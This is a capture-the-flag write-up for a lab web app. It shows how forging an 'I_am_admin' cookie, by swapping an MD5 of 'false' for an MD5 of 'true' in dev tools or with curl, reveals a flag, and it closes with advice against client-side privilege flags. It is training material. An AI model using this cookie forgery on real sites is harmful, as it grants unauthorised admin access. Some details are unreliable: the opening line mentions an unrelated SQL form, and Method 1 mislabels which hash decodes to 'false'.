# 05_Cookies

Unsecure sql request form in the index page (<http://192.168.1.102>)

## Method 1

Go to <http://192.168.1.102>
Next to the url bar click on the site information button
Select cookies, then click the categories to find the `I_am_admin` cookie

The cookie content contains the hash

```

b326b5062b2f0e69046810717534cb09

```

We can use md5 decode to decrypt it and encode a new one

```

b326b5062b2f0e69046810717534cb09 -> md5 decode -> false
true -> md5 encrypt -> b326b5062b2f0e69046810717534cb09

```

In the browser Inspect element. Go the `Application` tab  
Under `Storage` open the `Cookies` section.  
Here we can double click the cookie value and change it to our new hash (`true`).  
Refresh the page and the flag will appear in an alert.


## Method 2

Or if you prefer you can use curl to find the flag
When you run a curl to get information on the page above

```

curl -v -s 'http://192.168.1.102' -o /dev/null

```

#### result

```

kmatjeke% curl -v -s 'http://192.168.1.102' -o /dev/null
* Rebuilt URL to: http://192.168.1.102/
*   Trying 192.168.1.102...
* TCP_NODELAY set
* Connected to 192.168.1.102 (192.168.1.102) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.1.102
> User-Agent: curl/7.54.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.8.0
< Date: Tue, 05 Mar 2019 03:41:11 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/5.3.10-1ubuntu3.19
< Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Tue, 05-Mar-2019 04:41:11 GMT
< 
{ [6905 bytes data]
* Connection #0 to host 192.168.1.102 left intact

```

You see that there's a cookie with the value:   I_am_admin=68934a3e9455fa72420237eb05902327;
This looks like a hash (68934a3e9455fa72420237eb05902327)
and after decoding it you get the word "false".
It took me a while to figure this one out,
what if we set that cookie value to an md5 hash of the string true ???

let's find out ...

```

kmatjeke% curl -s 'http://192.168.1.102' -o before.html
kmatjeke% echo -n 'true' | md5
b326b5062b2f0e69046810717534cb09
kmatjeke% curl -s --cookie 'I_am_admin=b326b5062b2f0e69046810717534cb09' 'http://192.168.1.102' -o after.html
kmatjeke% diff before.html after.html
1c1
< <!DOCTYPE HTML>
---
> <script>alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3'); </script><!DOCTYPE HTML>
kmatjeke%

```

we get the flag: df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3

## Prevension

Never save sensitive session information on the browser.
Store information such as an admin on the database or
create the session variable on the back-end where it cannot be accessed.
Even if it means making a dirty protection, to know if you are the admin of a site, you might as well put it in an encrypted session rather than cookies.
